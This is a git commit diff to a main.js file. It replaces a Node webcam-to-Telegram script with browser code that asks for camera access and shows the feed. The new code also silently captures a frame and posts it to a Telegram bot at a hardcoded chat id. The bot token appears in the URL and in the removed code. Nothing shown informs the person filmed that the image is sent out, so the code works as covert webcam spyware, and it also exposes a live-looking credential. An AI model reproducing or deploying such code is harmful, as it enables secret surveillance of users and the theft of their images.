c865109de354e09963b1ac2813341b9daeb1cbf5
Hotchpok <d69677572@gmail.com>
2023-12-17 14:28:31 +0700

    sdf

--- main.js
+++ main.js
@@ -1,51 +1,33 @@
-// // Получаем доступ к видеопотоку с камеры
-// navigator.mediaDevices.getUserMedia({ video: true })
-// .then(stream => {
-//   const video = document.getElementById('cameraFeed');
-//   video.srcObject = stream;
-// })
-// .catch(error => {
-//   console.error('Ошибка при получении доступа к камере:', error);
-// });
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  const video = document.getElementById('cameraFeed');
+  video.srcObject = stream;
 
+  const canvas = document.createElement('canvas');
+  const context = canvas.getContext('2d');
 
+  function sendImageToTelegram(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', '1494753646');
+    formData.append('photo', blob, 'photo.png');
 
+    fetch('https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw/sendPhoto', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error('Ошибка:', error));
+  }
 
+  video.addEventListener('loadeddata', () => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-const TelegramBot = require('node-telegram-bot-api');
-const fs = require('fs');
-const NodeWebcam = require( "node-webcam" );
-
-// Настройки камеры
-const opts = {
-    width: 1280,
-    height: 720,
-    quality: 100,
-    delay: 0,
-    saveShots: true,
-    output: "jpeg",
-    device: false,
-    callbackReturn: "location",
-    verbose: false
-};
-
-// Создание объекта камеры
-const Webcam = NodeWebcam.create( opts );
-
-// Токен вашего бота в Телеграм
-const token = '6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw';
-const chatId = '1494753646';
-
-// Создание бота
-const bot = new TelegramBot(token, { polling: true });
-
-// Функция для создания фото и отправки в Телеграм
-function takeAndSendPhoto() {
-    Webcam.capture("test_picture", function( err, data ) {
-        const photo = fs.createReadStream( data );
-        bot.sendPhoto(chatId, photo, {caption: 'Новое фото'});
-    });
-}
-
-// Вызов функции для создания фото и отправки в Телеграм
-takeAndSendPhoto();
+    canvas.toBlob(sendImageToTelegram, 'image/png');
+  });
+})
+.catch(error => {
+  console.error('Ошибка при получении доступа к камере:', error);
+});
